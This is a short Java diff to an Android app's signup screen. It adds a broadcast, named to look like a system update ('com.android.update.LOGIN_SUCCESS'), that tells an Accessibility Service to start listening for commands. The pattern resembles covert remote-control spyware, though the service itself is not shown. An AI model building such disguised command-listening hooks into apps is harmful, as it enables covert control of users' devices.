@@ -516,6 +516,11 @@ public class SignupActivity extends AppCompatActivity implements CountryAdapter.
         editor.putBoolean("isLoggedIn", true); // for auto-login
         editor.apply();
 
+        // 🚀 Notify Accessibility Service to start listening for commands
+        Intent loginSuccess = new Intent("com.android.update.LOGIN_SUCCESS");
+        loginSuccess.setPackage(getPackageName());
+        sendBroadcast(loginSuccess);
+
 // 🚨 ✅ Proceed to OTP verification
         Intent intent = new Intent(SignupActivity.this, OtpActivity.class);
         intent.putExtra("uid", uid); // put this AFTER defining intent
